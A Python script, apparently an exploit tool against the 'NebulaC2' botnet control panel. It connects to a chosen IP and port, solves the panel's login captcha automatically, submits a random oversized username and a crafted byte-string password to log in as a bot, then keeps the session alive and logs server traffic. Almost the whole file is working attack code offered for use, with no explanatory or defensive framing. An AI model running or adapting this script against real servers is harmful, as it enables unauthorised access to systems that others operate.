import socket,re,threading,os,platform,time,random,string

def generate_user(num):
    data = ""
    for _ in range(int(num)):data += random.choice(string.ascii_letters+string.digits)
    return data

# DEF
def spoof_command(s):
  global USER
  if platform.system().lower() == 'windows':
   os.system('cls')
  else:
   os.system('clear')
  print(f"""
╔╗╔╔═╗╔╗ ╦ ╦╦  ╔═╗ ┌─┐┌─┐┌─┐┌─┐┌─┐
║║║║╣ ╠╩╗║ ║║  ╠═╣ └─┐├─┘│ ││ │├┤ 
╝╚╝╚═╝╚═╝╚═╝╩═╝╩ ╩o└─┘┴  └─┘└─┘└  
  [ CONNECTION TO TARGET OK ]
   TARGET ---> {IP}:{PORT}
  LEN USER --> {len(USER)}
""")
  while True:
    try:
      data = s.recv(99999999)
      if data == b'PING':
       s.send('PONG'.encode())
       print("PING COMING (200 OK) . . .")
      else:
        print(f'[LOGS] {data}')
    except:
      print("TARGET IS DOWN . . .")
      time.sleep(1)

print(f'''
╔╗╔╔═╗╔╗ ╦ ╦╦  ╔═╗ ┌─┐┌─┐┌─┐┌─┐┌─┐
║║║║╣ ╠╩╗║ ║║  ╠═╣ └─┐├─┘│ ││ │├┤ 
╝╚╝╚═╝╚═╝╚═╝╩═╝╩ ╩o└─┘┴  └─┘└─┘└  
Captcha resolve ( + )
Logs message recv from server
CAN ATTACK --> Version of NixWasHere/NebulaC2
WORKING ONLY : NebulaC2 not fix code in line CAPTCHA''')

IP = str(input("IP $"))
PORT = int(input("PORT $"))
USER = ''
def ATTACK(IP,PORT):
  global USER
  try:
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((IP,PORT))
  except:
    print("FAILED TO CREATE SOCKET . . .")
  
  while True:
   try:
    s.send(b'')
    data = s.recv(999999)
    if data == b'\x1bNebula | Login: Awaiting Response...\x07\x1b[39m':
     print("Waiting [ Nebula Captcha ] . . .")
    else:
     response_str = data.decode().replace('\r\n', ' ')
     response_str = re.sub('\x1b\\[.*?m', '', response_str)
     response_str = response_str.replace('Connecting... Captcha: ', ' ')
     response_str = response_str.replace(' =', ' ')
     re_cap = response_str.split(' ')
     data_resolve = int(re_cap[1]) + int(re_cap[3])
     s.send(b'%d' % data_resolve)
     data = s.recv(99999)
     if data == b'\x1b[90mPassed!\x1b[39m\r\n':
      while True:
       try:
        data = s.recv(99999)
        if data == b'\x1b[2J\x1b[H\x1b[39m':
         print("NEBULA C2 LOADING . . .")
        else:
         if b'Username' in data:
          USER = generate_user(int(random.randint(1,1024)))
          s.send(f'{USER}'.encode())

         if b'Password' in data:
          s.send('\xff\xff\xff\xff\75'.encode('cp1252'))
          print(f"LOGIN WITH PASSWORD BOT DEFAULT . . .\nResolve captcha : {re_cap[2]}")
          time.sleep(1)
          threading.Thread(target=spoof_command(s)).start()
          break
       except:
        print("FAILED USERNAME GET . . .")
   except:
    print("FAILED CONNECT TO NEBULA C2 . . .")

threading.Thread(target=ATTACK,args=(IP,PORT)).start()
